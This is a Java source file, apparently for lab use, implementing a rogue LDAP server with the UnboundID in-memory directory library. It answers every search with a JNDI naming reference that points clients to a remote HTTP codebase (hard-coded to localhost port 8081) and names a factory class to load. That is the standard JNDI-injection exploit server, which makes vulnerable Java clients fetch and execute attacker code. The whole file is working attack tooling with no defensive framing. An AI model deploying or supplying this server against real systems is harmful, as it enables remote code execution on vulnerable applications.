package test.ldap;
 
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
 
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
 
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
 
public class LdapServer {
 
    private static final String LDAP_BASE = "dc=example,dc=com";
 
    public static void main(String[] argsx) {
        String[] args = new String[]{"http://127.0.0.1:8081/", "9999"};
        int port = 0;
        if (args.length < 1 ) {
            System.err.println(LdapServer.class.getSimpleName() + " <codebase_url#classname> [<port>]"); //$NON-NLS-1$
            System.exit(-1);
        } else if (args.length > 1) {
            port = Integer.parseInt(args[1]);
        }
 
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
 
            config.addInMemoryOperationInterceptor(new OperationInterceptor(args[0]));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();
 
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
 
    private static class OperationInterceptor extends InMemoryOperationInterceptor {
 
        private String codebases;
 
        public OperationInterceptor(String cb) {
            this.codebases = cb;
        }
 
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            } catch (Exception e1) {
                e1.printStackTrace();
            }
 
        }
 
        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
//Ldap->Reference
            e.addAttribute("javaClassName", "foo");
            e.addAttribute("javaCodeBase", codebases);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", base);
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
 
    }
}